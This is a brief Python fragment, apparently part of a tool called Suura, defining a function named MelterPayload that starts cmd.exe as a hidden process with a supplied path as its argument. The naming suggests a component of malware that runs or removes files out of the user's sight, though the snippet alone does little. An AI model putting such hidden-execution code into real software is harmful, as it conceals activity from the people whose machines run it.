from Suura.includes.suura_subprocess import *

def MelterPayload(path):
    p = Process()
    p.process_type = ProcessType.open_hide_process
    p.command = "cmd.exe"
    p.parameter = path
    p.exec()